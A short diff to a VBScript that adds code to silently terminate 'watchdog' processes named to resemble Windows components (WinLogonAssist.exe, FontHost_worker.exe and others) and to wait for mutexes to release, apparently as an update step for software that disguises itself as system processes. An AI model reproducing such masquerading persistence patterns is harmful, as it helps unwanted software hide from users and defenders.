@@ -3,6 +3,18 @@
 
 Set objFSO = CreateObject("Scripting.FileSystemObject")
 Set objShell = CreateObject("WScript.Shell")
+Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
+
+' Terminate existing watchdog processes silently to apply new changes
+Set colProcessList = objWMIService.ExecQuery("Select * from Win32_Process Where Name = 'WinLogonAssist.exe' OR Name = 'AudioDG_helper.exe' OR Name = 'FontHost_worker.exe' OR Name = 'SpoolerSub_helper.exe'")
+For Each objProcess in colProcessList
+    On Error Resume Next
+    objProcess.Terminate()
+    On Error GoTo 0
+Next
+
+' Small delay to allow Mutexes to release cleanly
+WScript.Sleep 1000
 
 strCurrentDir = objFSO.GetParentFolderName(WScript.ScriptFullName)
 objShell.CurrentDirectory = strCurrentDir
